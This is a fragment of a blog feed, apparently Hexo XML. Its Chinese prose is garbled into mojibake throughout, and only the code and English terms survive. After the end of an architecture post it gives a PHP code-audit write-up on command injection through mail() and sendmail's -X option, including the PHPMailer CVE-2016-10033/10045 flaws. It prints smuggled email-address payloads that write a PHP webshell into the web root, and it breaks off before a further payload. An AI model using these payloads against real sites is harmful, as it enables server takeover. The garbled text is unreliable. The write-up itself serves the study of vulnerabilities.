å¾®æœåŠ¡æ¶æ„æ˜¯ä¸€ç§è®¾è®¡æ–¹æ³•ï¼Œå…¶ä¸­åº”ç”¨ç¨‹åºè¢«æ„å»ºä¸ºä¸€ç»„å°çš„æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡æ‰§è¡Œå•ä¸€åŠŸèƒ½ï¼Œè¿è¡Œåœ¨å…¶è‡ªå·±çš„è¿›ç¨‹ä¸­ï¼Œå¹¶é€šè¿‡è½»é‡çº§é€šä¿¡æœºåˆ¶ï¼ˆé€šå¸¸æ˜¯HTTPèµ„æºAPIï¼‰è¿›è¡Œé€šä¿¡ã€‚æ¯ä¸ªæœåŠ¡éƒ½å›´ç»•ä¸šåŠ¡èƒ½åŠ›æ„å»ºï¼Œå¹¶ç‹¬ç«‹äºå…¶ä»–æœåŠ¡è¿›è¡Œéƒ¨ç½²ã€‚ï¼ˆDockerã€Kubernetesã€API Gatewayï¼‰<br>5. æ— æœåŠ¡å™¨æ¶æ„ (Serverless Architecture) æ— æœåŠ¡å™¨æ¶æ„å…è®¸å¼€å‘è€…ç¼–å†™å’Œéƒ¨ç½²ä»£ç è€Œä¸éœ€è¦å…³æ³¨åº•å±‚æœåŠ¡å™¨ã€‚è¿è¡Œæ—¶ï¼Œä»£ç åœ¨çŠ¶æ€ä¸ºæ— çš„å®¹å™¨ä¸­æ‰§è¡Œï¼Œè¿™äº›å®¹å™¨ç”±äº‘æä¾›å•†åŠ¨æ€ç®¡ç†ã€‚å¼€å‘è€…åªéœ€å…³æ³¨ä»£ç å’Œåº”ç”¨é€»è¾‘ï¼Œè€Œæ— éœ€ç®¡ç†æœåŠ¡å™¨æˆ–è¿è¡Œæ—¶ç¯å¢ƒã€‚ï¼ˆAWS Lambdaã€Azure Functionsã€Google Cloud Functionsï¼‰</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/2406698">æ·±åº¦è§£æå››å¤§ä¸»æµè½¯ä»¶æ¶æ„æ¨¡å‹ï¼šå•ä½“æ¶æ„ã€åˆ†å¸ƒå¼åº”ç”¨ã€å¾®æœåŠ¡ä¸Serverlessçš„ä¼˜ç¼ºç‚¹åŠåœºæ™¯åº”ç”¨</a></p><h2 id="æ¶‰åŠæ¨¡å¼"><a href="#æ¶‰åŠæ¨¡å¼" class="headerlink" title="æ¶‰åŠæ¨¡å¼"></a>æ¶‰åŠæ¨¡å¼</h2><p><a href="https://liaoxuefeng.com/books/java/design-patterns/creational/index.html">å»–å­¦é”‹çš„ç½‘ç«™è®²çš„è®¾è®¡æ¨¡å¼</a><br><a href="https://www.runoob.com/design-pattern/visitor-pattern.html">èœé¸Ÿæ•™ç¨‹è®¾è®¡æ¨¡å¼</a><br><a href="https://segmentfault.com/a/1190000030850326">å›¾è§£ä¹ç§è®¾è®¡æ¨¡å¼</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘PHPä»£ç å®¡è®¡2</title>
      <link href="/2024/10/10/WebSecurity/codeaudit/phpaudit2/"/>
      <url>/2024/10/10/WebSecurity/codeaudit/phpaudit2/</url>
      
        <content type="html"><![CDATA[<h2 id="postcard"><a href="#postcard" class="headerlink" title="postcard"></a>postcard</h2><p>é¢˜ç›®å«åšæ˜ä¿¡ç‰‡ï¼Œä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png"><br><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™é“é¢˜å…¶å®æ˜¯è€ƒå¯Ÿç”± <strong>php</strong> å†…ç½®å‡½æ•° <strong>mail</strong> æ‰€å¼•å‘çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹ <strong>php</strong> è‡ªå¸¦çš„ <strong>mail</strong> å‡½æ•°çš„ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">mail</span> (</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$to</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$subject</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$message</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_headers</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_parameters</span> ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å…¶å‚æ•°å«ä¹‰åˆ†åˆ«è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><blockquote><ul><li>toï¼ŒæŒ‡å®šé‚®ä»¶æ¥æ”¶è€…ï¼Œå³æ¥æ”¶äºº</li><li>subjectï¼Œé‚®ä»¶çš„æ ‡é¢˜</li><li>messageï¼Œé‚®ä»¶çš„æ­£æ–‡å†…å®¹</li><li>additional_headersï¼ŒæŒ‡å®šé‚®ä»¶å‘é€æ—¶å…¶ä»–çš„é¢å¤–å¤´éƒ¨ï¼Œå¦‚å‘é€è€…Fromï¼ŒæŠ„é€CCï¼Œéšè—æŠ„é€BCC</li><li>additional_parametersï¼ŒæŒ‡å®šä¼ é€’ç»™å‘é€ç¨‹åºsendmailçš„é¢å¤–å‚æ•°ã€‚</li></ul></blockquote><p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œ <strong>php</strong> çš„ <strong>mail</strong> å‡½æ•°åœ¨åº•å±‚ä¸­å·²ç»å†™å¥½äº†ï¼Œé»˜è®¤è°ƒç”¨ <strong>Linux</strong> çš„ <strong><a href="http://www.sendmail.com/">sendmail</a></strong> ç¨‹åºå‘é€é‚®ä»¶ã€‚è€Œåœ¨é¢å¤–å‚æ•°( <strong>additional_parameters</strong> )ä¸­ï¼Œ <strong>sendmail</strong> ä¸»è¦æ”¯æŒçš„é€‰é¡¹æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p><blockquote><ul><li><p>-O option &#x3D; value</p><p>QueueDirectory &#x3D; queuedir é€‰æ‹©é˜Ÿåˆ—æ¶ˆæ¯</p></li><li><p>-X logfile</p><p>è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šä¸€ä¸ªç›®å½•æ¥è®°å½•å‘é€é‚®ä»¶æ—¶çš„è¯¦ç»†æ—¥å¿—æƒ…å†µã€‚</p></li><li><p>-f from email</p><p>è¿™ä¸ªå‚æ•°å¯ä»¥è®©æˆ‘ä»¬æŒ‡å®šæˆ‘ä»¬å‘é€é‚®ä»¶çš„é‚®ç®±åœ°å€ã€‚</p></li></ul></blockquote><p>ä¸¾ä¸ªç®€å•ä¾‹å­æ–¹ä¾¿ç†è§£: </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png"></p><p>ä¸Šé¢è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <strong>-X</strong> å‚æ•°æŒ‡å®šæ—¥å¿—æ–‡ä»¶ï¼Œæœ€ç»ˆä¼šåœ¨ <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> ä¸­å†™å…¥å¦‚ä¸‹æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™é¢˜å¦‚æœåªæ˜¯è¿™ä¸€ä¸ªé—®é¢˜çš„è¯ï¼Œä¼šæ˜¾çš„å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œåœ¨ <strong>ç¬¬3è¡Œ</strong> æœ‰è¿™æ ·ä¸€ä¸²ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure><p>è¿™ä¸²ä»£ç çš„ä¸»è¦ä½œç”¨ï¼Œæ˜¯ç¡®ä¿åœ¨ç¬¬5ä¸ªå‚æ•°ä¸­åªä½¿ç”¨æœ‰æ•ˆçš„ç”µå­é‚®ä»¶åœ°å€ <strong>$email</strong> ã€‚æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ <strong>filter_var()</strong> å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.filter-var.php">filter_var</a></strong> ï¼šä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</span><br></pre></td></tr></table></figure><p><strong>åŠŸèƒ½</strong> ï¼šè¿™é‡Œä¸»è¦æ˜¯æ ¹æ®ç¬¬äºŒä¸ªå‚æ•°filterè¿‡æ»¤ä¸€äº›æƒ³è¦è¿‡æ»¤çš„ä¸œè¥¿ã€‚</p></blockquote><p>å…³äº <strong>filter_var()</strong> ä¸­ <strong>FILTER_VALIDATE_EMAIL</strong> è¿™ä¸ªé€‰é¡¹ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªå¸–å­ <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> ã€‚è¿™é‡Œé¢æœ‰ä¸ªç»“è®ºå¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼š <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„ç‰¹æ®Šç¬¦å·å¿…é¡»æ”¾åœ¨åŒå¼•å·ä¸­ã€‚ <strong>filter_var()</strong> é—®é¢˜åœ¨äºï¼Œæˆ‘ä»¬åœ¨åŒå¼•å·ä¸­åµŒå¥—è½¬ä¹‰ç©ºæ ¼ä»ç„¶èƒ½å¤Ÿé€šè¿‡æ£€æµ‹ã€‚åŒæ—¶ç”±äºåº•å±‚æ­£åˆ™è¡¨è¾¾å¼çš„åŸå› ï¼Œæˆ‘ä»¬é€šè¿‡é‡å å•å¼•å·å’ŒåŒå¼•å·ï¼Œæ¬ºéª— <strong>filter_val()</strong> ä½¿å…¶è®¤ä¸ºæˆ‘ä»¬ä»ç„¶åœ¨åŒå¼•å·ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚ä¸‹é¢ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œæ–¹ä¾¿ç†è§£ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png"></p><p>å½“ç„¶ç”±äºå¼•å…¥çš„ç‰¹æ®Šç¬¦å·ï¼Œè™½ç„¶ç»•è¿‡äº† <strong>filter_var()</strong> é’ˆå¯¹é‚®ç®±çš„æ£€æµ‹ï¼Œä½†æ˜¯ç”±äºPHPçš„ <strong>mail()</strong> å‡½æ•°åœ¨åº•å±‚å®ç°ä¸­ï¼Œè°ƒç”¨äº† <strong>escapeshellcmd()</strong> å‡½æ•°ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„é‚®ç®±åœ°å€è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´å³ä½¿å­˜åœ¨ç‰¹æ®Šç¬¦å·ï¼Œä¹Ÿä¼šè¢« <strong>escapeshellcmd()</strong> å‡½æ•°å¤„ç†è½¬ä¹‰ï¼Œè¿™æ ·å°±æ²¡åŠæ³•è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„äº†ã€‚ <strong>escapeshellcmd()</strong> å‡½æ•°åœ¨åº•å±‚ä»£ç å¦‚ä¸‹ï¼ˆè¯¦ç»†ç‚¹ <a href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">è¿™é‡Œ</a> ï¼‰ï¼š<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png"><br>å› æ­¤æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œåœ¨ç¬¬ä¸ƒè¡Œæœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure><p>è¿™å¥ä»£ç ä¸»è¦æ˜¯å¤„ç† <strong>$email</strong> ä¼ å…¥çš„æ•°æ®ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ <strong>escapeshellarg</strong> å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></strong> â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p><p><strong>åŠŸèƒ½</strong> ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec()ï¼Œsystem() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p><p><strong>å®šä¹‰</strong> ï¼š<code>string escapeshellarg ( string $arg )</code></p></blockquote><p>å…·ä½“åŠŸèƒ½ä½œç”¨ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹æ¡ˆä¾‹ï¼š<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png"><br>é‚£æˆ‘ä»¬å‰é¢è¯´è¿‡äº†PHPçš„ <strong>mail()</strong> å‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº† <strong>escapeshellcmd()</strong> å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„é‚®ç®±åœ°å€è¿›è¡Œå¤„ç†ï¼Œå³ä½¿æˆ‘ä»¬ä½¿ç”¨å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„payloadï¼Œç»•è¿‡ <strong>filter_var()</strong> çš„æ£€æµ‹ï¼Œä½†è¿˜æ˜¯ä¼šè¢« <strong>escapeshellcmd()</strong> å¤„ç†ã€‚ç„¶è€Œ <strong>escapeshellcmd()</strong> å’Œ <strong>escapeshellarg</strong> ä¸€èµ·ä½¿ç”¨ï¼Œä¼šé€ æˆç‰¹æ®Šå­—ç¬¦é€ƒé€¸ï¼Œä¸‹é¢æˆ‘ä»¬ç»™ä¸ªç®€å•ä¾‹å­ç†è§£ä¸€ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png"></p><p>è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</p><ol><li><p>ä¼ å…¥çš„å‚æ•°æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure></li><li><p>ç”±äº<code>escapeshellarg</code>å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚æ‰€ä»¥å¤„ç†ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure></li><li><p>æ¥ç€ <code>escapeshellcmd</code> å‡½æ•°å¯¹ç¬¬äºŒæ­¥å¤„ç†åå­—ç¬¦ä¸²ä¸­çš„ <code>\</code> ä»¥åŠ <code>a=1&#39;</code> ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure></li><li><p>ç”±äºç¬¬ä¸‰æ­¥å¤„ç†ä¹‹åçš„payloadä¸­çš„ <code>\\</code> è¢«è§£é‡Šæˆäº† <code>\</code> è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥å•å¼•å·é…å¯¹è¿æ¥ä¹‹åå°†payloadåˆ†å‰²ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p></li></ol><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png"></p><p>æ‰€ä»¥è¿™ä¸ªpayloadå¯ä»¥ç®€åŒ–ä¸º <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ï¼Œå³å‘ <code>127.0.0.1\</code> å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º <code>a=1&#39;</code> ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œè¿™é¢˜å®é™…ä¸Šæ˜¯è€ƒå¯Ÿç»•è¿‡ <strong>filter_var()</strong> å‡½æ•°çš„é‚®ä»¶åæ£€æµ‹ï¼Œé€šè¿‡ <strong>mail</strong> å‡½æ•°åº•å±‚å®ç°ä¸­è°ƒç”¨çš„ <strong>escapeshellcmd()</strong> å‡½æ•°å¤„ç†å­—ç¬¦ä¸²ï¼Œå†ç»“åˆ <strong>escapeshellarg()</strong> å‡½æ•°ï¼Œæœ€ç»ˆå®ç°å‚æ•°é€ƒé€¸ï¼Œå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong> ã€‚</p><h3 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>è¿™é‡Œå®ä¾‹åˆ†æé€‰æ‹© <strong>PHPMailer å‘½ä»¤æ‰§è¡Œæ¼æ´</strong> ï¼ˆ  <strong>CVE-2016-10045</strong> å’Œ <strong>CVE-2016-10033</strong> ï¼‰ã€‚é¡¹ç›®ä»£ç å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¸‹è½½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/PHPMailer/PHPMailer</span><br><span class="line"><span class="built_in">cd</span> PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br></pre></td></tr></table></figure><h4 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>æ¼æ´åŸç†</p><p>åœ¨githubä¸Šç›´æ¥diffä¸€ä¸‹ï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸åŒç‰ˆæœ¬çš„ <strong><a href="https://github.com/PHPMailer/PHPMailer/compare/v5.2.17...v5.2.18#diff-ace81e501931d8763b49f2410cf3094d">class.phpmailer.php</a></strong> æ–‡ä»¶ï¼Œå·®å¼‚å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png"></p><p>è¿™é‡Œåœ¨ <strong>sendmailSend</strong> å‡½æ•°ä¸­åŠ äº† <strong>validateAddress</strong> å‡½æ•°ï¼Œæ¥é’ˆå¯¹å‘é€çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­é‚®ç®±åœ°å€çš„åˆæ³•æ€§ã€‚å¦å¤–é’ˆå¯¹ä¼ å…¥çš„æ•°æ®ï¼Œè°ƒç”¨äº† <strong>escapeshellarg</strong> å‡½æ•°æ¥è½¬ä¹‰ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢æ³¨å…¥å‚æ•°ã€‚ç„¶è€Œè¿™æ ·åšï¼Œå°±å¼•å…¥äº†æˆ‘ä»¬ä¸Šé¢è®¨è®ºçš„é—®é¢˜ï¼Œå³åŒæ—¶ä½¿ç”¨ <strong>escapeshellarg</strong> å‡½æ•°å’Œ <strong>escapeshellcmd()</strong> å‡½æ•°ï¼Œå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹ä¼ å‘½ä»¤å‚æ•°çš„åœ°æ–¹è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»“åˆ <strong>mail</strong> å‡½æ•°çš„ç¬¬äº”ä¸ªå‚æ•° <strong>-X</strong> å†™å…¥ <strong>webshell</strong> ã€‚</p><p>ä¸‹é¢è¯¦ç»†çœ‹ä¸€ä¸‹ä»£ç ï¼Œæ¼æ´å…·ä½“ä½ç½®åœ¨ <strong>class.phpmailer.php</strong> ä¸­ï¼Œæˆ‘ä»¬æˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç å¦‚ä¸‹ ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png"></p><p>åœ¨ä¸Šå›¾ç¬¬12è¡Œå¤„æ²¡æœ‰å¯¹ <strong>$params</strong> å˜é‡è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œåªæ˜¯ç®€å•åœ°åˆ¤æ–­æ˜¯å¦ä¸º <strong>null</strong> ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¼ å…¥å‘½ä»¤ã€‚æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œæˆ‘ä»¬å‘ç°åœ¨ä¸Šå›¾ç¬¬12è¡Œï¼Œå½“ <strong>safe_mode</strong> æ¨¡å¼å¤„äºå…³é—­çŠ¶æ€æ—¶ï¼Œ <strong>mail()</strong> å‡½æ•°æ‰ä¼šä¼ å…¥ <strong>$params</strong> å˜é‡ã€‚<br>è¿›ä¸€æ­¥è·Ÿè·Ÿè¿› <strong>$params</strong> å‚æ•°ï¼Œçœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆæ¥çš„ã€‚è¿™ä¸ªå‚æ•°çš„ä½ç½®åœ¨ <strong>class.phpmailer.php</strong> ä¸­ï¼Œæˆ‘ä»¬æˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç ï¼Œå…·ä½“çœ‹ä¸‹å›¾ <strong>ç¬¬11è¡Œ</strong> ï¼š </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png"></p><p>å¾ˆæ˜æ˜¾ <strong>$params</strong> æ˜¯ä» <strong>$this-&gt;Sender</strong> ä¼ è¿›æ¥çš„ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹ <strong>$this-&gt;Sender</strong> ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°åœ¨ <strong>class.phpmailer.php</strong> ä¸­ï¼Œæˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç ï¼Œå…·ä½“çœ‹ä¸‹å›¾ <strong>ç¬¬10è¡Œ</strong> ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png"></p><p>è¿™é‡Œåœ¨ <strong>setFrom</strong> å‡½æ•°ä¸­å°† <strong>$address</strong> ç»è¿‡æŸäº›å¤„ç†ä¹‹åèµ‹å€¼ç»™ <strong>$this-&gt;Sender</strong> ã€‚æˆ‘ä»¬è¯¦ç»†çœ‹çœ‹ <strong>$address</strong> å˜é‡æ˜¯å¦‚ä½•å¤„ç†çš„ã€‚ä¸»è¦å¤„ç†å‡½æ•°å‡åœ¨ <strong>class.phpmailer.php</strong> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æˆªå–äº†éƒ¨åˆ†ç›¸å…³ä»£ç ï¼Œåœ¨ä¸‹å›¾ <strong>ç¬¬ä¸‰è¡Œ</strong> ä¸­ä½¿ç”¨äº† <strong>validateAddress</strong> æ¥å¤„ç† <strong>$address</strong> å˜é‡ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png"></p><p>æ‰€ä»¥è·Ÿè¿›ä¸€ä¸‹ <strong>validateAddress</strong> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä½ç½®åœ¨ <strong>class.phpmailer.php</strong> æ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬çœ‹çœ‹ç¨‹åºæµç¨‹ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png"></p><p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¯¹ç¯å¢ƒè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰ <strong>prce</strong> å¹¶ä¸” <strong>php</strong> ç‰ˆæœ¬ <strong>&lt;5.2.0</strong> ï¼Œåˆ™ <strong>$patternselect &#x3D; â€˜noregexâ€™</strong> ã€‚æ¥ç€å¾€ä¸‹çœ‹ï¼Œåœ¨ <strong>class.phpmailer.php</strong> æ–‡ä»¶ä¸­ï¼Œæœ‰éƒ¨åˆ†å…³äº <strong>$patternselect</strong> çš„ <strong>swich</strong> æ“ä½œï¼Œæˆ‘åªé€‰æ‹©äº†æˆ‘ä»¬éœ€è¦çš„é‚£ä¸ªï¼Œè·Ÿè¸ªåˆ°ä¸‹é¢çš„ <strong>noregex</strong> ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png"></p><p>è¿™é‡Œç®€å•çš„åªæ˜¯æ ¹æ® <strong>@</strong> ç¬¦å·æ¥å¤„ç†å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œçš„payloadå¾ˆç®€å•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ <strong>linux</strong> è‡ªèº«çš„ <strong>sendmail</strong> å†™logçš„æ–¹å¼ï¼ŒæŠŠlogå†™åˆ°webæ ¹ç›®å½•ä¸‹ã€‚å°†æ—¥å¿—æ–‡ä»¶åç¼€å®šä¹‰ä¸º <strong>.php</strong> ï¼Œå³å¯æˆåŠŸå†™å…¥webshellã€‚</p><h4 id="CVE-2016-10045-1"><a href="#CVE-2016-10045-1" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>diffä¸€ä¸‹5.2.20å’Œ5.2.18å‘ç°é’ˆå¯¹ <strong>escapeshellcmd</strong> å’Œ <strong>escapeshellarg</strong> åšäº†æ”¹åŠ¨ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png"></p><p>è¿™é‡Œå…¶å®æœ‰ä¸ªå¾ˆå¥‡å¦™çš„æ¼æ´ï¼Œé’ˆå¯¹ç”¨æˆ·è¾“å…¥ä½¿ç”¨ <strong>escapeshellarg</strong> å‡½æ•°è¿›è¡Œå¤„ç†ã€‚æ‰€ä»¥ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä½¿ç”¨ä¹‹å‰çš„ payload è¿›è¡Œæ”»å‡»ä¼šå¤±è´¥ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œå´å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ª  <strong>payload</strong> 